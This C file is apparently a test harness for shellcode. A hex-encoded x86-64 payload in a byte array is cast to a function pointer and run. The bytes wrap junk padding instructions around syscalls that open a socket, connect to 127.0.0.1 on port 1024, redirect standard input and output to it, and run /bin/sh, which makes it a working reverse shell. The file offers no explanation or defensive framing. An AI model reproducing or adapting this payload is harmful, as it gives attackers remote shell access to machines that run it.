
#include <stdio.h>
#include <string.h>

int main(int ac, char **av)
{
	unsigned char buf[] = "\x4d\x31\xc9\x4d\x31\xf6\x4d\x31\xd2\x4d\x31\xd2\x4d\x31\xf6\x4d\x31\xdb\x4d\x31\xf6\x4d\x31\xc9\x4d\x31\xdb\x4d\x31\xc0\x4d\x31\xe4\x48\x31\xc0\x48\x31\xdb\x48\x31\xd2\x48\x31\xff\x48\x31\xf6\xb0\x29\x40\xb7\x02\x40\xb6\x01\x0f\x05\x4d\x31\xc9\x4d\x31\xf6\x4d\x31\xe4\x4d\x31\xdb\x4d\x31\xdb\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xc9\x4d\x31\xdb\x4d\x31\xc9\x49\x89\xc5\xb0\x2a\x4c\x89\xef\x48\x31\xf6\xbe\x90\x11\x11\x12\x48\x81\xee\x11\x11\x11\x11\x56\x66\x41\xbe\x14\x11\x66\x41\xbd\x21\x22\x66\x41\x81\xed\x11\x11\x66\x45\x29\xee\x66\x41\x56\x66\x6a\x02\x48\x89\xe6\xb2\x18\x0f\x05\x4d\x31\xc9\x4d\x31\xc0\x4d\x31\xd2\x4d\x31\xf6\x4d\x31\xd2\x4d\x31\xd2\x4d\x31\xd2\x4d\x31\xc9\x48\x31\xc0\x48\x31\xd2\xb0\x21\x4c\x89\xef\x48\x31\xf6\x0f\x05\x4d\x31\xf6\x4d\x31\xd2\x4d\x31\xe4\x4d\x31\xc0\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xc0\x4d\x31\xd2\x4d\x31\xe4\x4d\x31\xc9\x4d\x31\xc0\x48\x31\xc0\x48\x31\xd2\xb0\x21\x4c\x89\xef\x48\xff\xc6\x0f\x05\x4d\x31\xc0\x4d\x31\xc0\x4d\x31\xe4\x4d\x31\xdb\x4d\x31\xed\x4d\x31\xff\x48\x31\xff\x48\x31\xf6\x48\x31\xc0\x41\x55\x49\xbd\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x41\x55\x48\x89\xe7\x41\x57\x57\x48\x89\xe6\xb0\x3b\x48\x31\xd2\x0f\x05\x4d\x31\xf6\x4d\x31\xdb\x4d\x31\xf6\x4d\x31\xdb\x4d\x31\xc0\x4d\x31\xc0\x4d\x31\xc0\x4d\x31\xdb\x4d\x31\xc9\x4d\x31\xf6\xb0\x3c\x48\x31\xff\x0f\x05";
	int (*func)();
	func = (int(*)())buf;
	(int)(*func)();
}